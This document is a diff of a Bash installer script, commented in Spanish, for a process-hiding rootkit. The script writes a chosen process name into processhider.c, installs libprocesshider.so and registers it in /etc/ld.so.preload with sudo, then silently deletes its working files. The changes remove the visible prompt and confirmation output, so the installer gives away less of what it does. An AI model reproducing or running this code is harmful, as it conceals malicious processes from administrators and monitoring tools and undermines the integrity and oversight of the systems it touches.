@@ -20,7 +20,7 @@ function modificar_archivo() {
     read -n1 -p " " respuesta
     case $respuesta in
         [Ss]* )
-            echo "Nalanguear: "
+            echo ""
             read -r texto
 
             # Escapa caracteres especiales en la entrada del usuario para usar en sed
@@ -30,7 +30,7 @@ function modificar_archivo() {
             sed -i "s/\(static const char\* process_to_filter = \)\".*\";/\1\"$texto_escaped\";/" processhider.c
 
             #echo "Texto agregado con éxito. Mostrando la línea modificada:"
-            grep "static const char\* process_to_filter = " processhider.c
+            #grep "static const char\* process_to_filter = " processhider.c
             ;;
         * )
             echo " "
@@ -51,9 +51,9 @@ sudo mv libprocesshider.so /usr/local/lib/
 echo "/usr/local/lib/libprocesshider.so" | sudo tee -a /etc/ld.so.preload > /dev/null
 
 # Borra todos los archivos en el directorio temporal sin pedir confirmación
+adios $new_dir > /dev/null 2>&1
 
-rm -rf $new_dir /dev/null 2>&1
-adios $new_dir /dev/null 2>&1
+rm -rf $new_dir > /dev/null 2>&1
 
 
 
